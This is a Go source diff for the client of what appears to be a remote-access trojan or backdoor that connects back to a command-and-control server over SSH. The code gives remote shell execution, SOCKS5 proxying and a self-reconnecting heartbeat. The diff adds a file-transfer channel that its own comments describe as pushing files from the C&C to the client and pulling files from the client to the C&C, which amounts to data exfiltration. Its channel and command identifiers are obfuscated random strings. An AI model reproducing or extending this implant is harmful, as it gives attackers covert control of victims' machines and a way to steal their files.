@@ -5,7 +5,9 @@ import (
 	"encoding/base32"
 	"fmt"
 	"golang.org/x/crypto/ssh"
+	"io"
 	"net"
+	"os"
 	"os/exec"
 	"runtime"
 	"srt/client/go-socks5"
@@ -14,12 +16,12 @@ import (
 
 var (
 	chanExit  = make(chan int)
-	SSHHost   = "127.0.0.1"
-	SSHPort   = "2222"
-	SSHUser   = "tom"
-	SSHPwd    = "fuckingkey"
-	SocksUser = "foo"
-	SocksPwd  = "bar"
+	SSHHost   = ""
+	SSHPort   = ""
+	SSHUser   = ""
+	SSHPwd    = ""
+	SocksUser = ""
+	SocksPwd  = ""
 	Tag       = ""
 )
 
@@ -27,8 +29,11 @@ const (
 	CHAN_FORWARD   = "RbgEySPMPi"
 	CHAN_HEARTBEAT = "uSYeIbUQoR"
 	CHAN_COMMAND   = "rIHqXLCqRN"
+	CHAN_TRANS     = "SYeILCqrcD"
 	COMMAND_KILL   = "aAjcDqEIvI"
 	COMMAND_CMD    = "aAjkkqEIvI"
+	TRANS_UP       = "zEAYtwDlDr"
+	TRANS_DOWN     = "RAsTfZahHD"
 )
 
 type Config struct {
@@ -106,55 +111,90 @@ func (c *Client) handleChannel(newChannel ssh.NewChannel) {
 	chanType := newChannel.ChannelType()
 	switch chanType {
 	case CHAN_FORWARD:
-		go c.SockServer.ServeConn(channel, c.ServerAddr)
+		c.SockServer.ServeConn(channel, c.ServerAddr)
 	case CHAN_HEARTBEAT:
-		go func() {
-			channel.Write([]byte(c.Config.Tag))
-			bufConn := bufio.NewReader(channel)
-			tcommand := make([]byte, 4)
-			for {
-				if _, err := bufConn.Read(tcommand); err != nil {
-					for {
-						err := c.connect()
-						if err == nil {
-							break
-						}
-						time.Sleep(3 * time.Second)
+		channel.Write([]byte(c.Config.Tag))
+		bufConn := bufio.NewReader(channel)
+		tcommand := make([]byte, 4)
+		for {
+			if _, err := bufConn.Read(tcommand); err != nil {
+				for {
+					err := c.connect()
+					if err == nil {
+						break
 					}
-					return
+					time.Sleep(3 * time.Second)
 				}
+				return
 			}
-		}()
+		}
 	case CHAN_COMMAND:
-		go func() {
-			bufConn := bufio.NewReader(channel)
-			tcommand := make([]byte, 256)
-			for {
-				n, err := bufConn.Read(tcommand)
-				if err != nil {
-					return
-				}
-				command := string(tcommand[:n])
-				switch command {
-				case COMMAND_KILL:
-					chanExit <- 1
-					return
-				case COMMAND_CMD:
-					if cmdString() == "unknow" {
-						channel.Close()
-						return
-					}
-					cmd := exec.Command(cmdString())
-					cmd.Stdin = channel
-					cmd.Stdout = channel
-					cmd.Stderr = channel
-					cmd.Run()
+
+		bufConn := bufio.NewReader(channel)
+		tcommand := make([]byte, 256)
+		for {
+			n, err := bufConn.Read(tcommand)
+			if err != nil {
+				return
+			}
+			command := string(tcommand[:n])
+			switch command {
+			case COMMAND_KILL:
+				chanExit <- 1
+				return
+			case COMMAND_CMD:
+				if cmdString() == "unknow" {
 					channel.Close()
 					return
 				}
-
+				cmd := exec.Command(cmdString())
+				cmd.Stdin = channel
+				cmd.Stdout = channel
+				cmd.Stderr = channel
+				cmd.Run()
+				channel.Close()
+				return
 			}
-		}()
+
+		}
+	case CHAN_TRANS:
+		bufConn := bufio.NewReader(channel)
+		tcommand := make([]byte, 256)
+		n, err := bufConn.Read(tcommand)
+		if err != nil {
+			channel.Close()
+			return
+		}
+		command := string(tcommand[:n])
+		if len(command) <= 10 {
+			channel.Close()
+			return
+		}
+		cmd := command[:10]
+		path := command[10:]
+		switch cmd {
+		//c&c > client = UP
+		case TRANS_UP:
+			f, err := os.Create(path)
+			defer f.Close()
+			if err != nil {
+				channel.Close()
+				return
+			}
+			io.Copy(f, channel)
+			defer channel.Close()
+		// client > c&c = DOWN
+		case TRANS_DOWN:
+			f, err := os.Open(path)
+			if err != nil {
+				channel.Close()
+				return
+			}
+			defer f.Close()
+			io.Copy(channel, f)
+			channel.Close()
+		}
+
 	}
 }
 
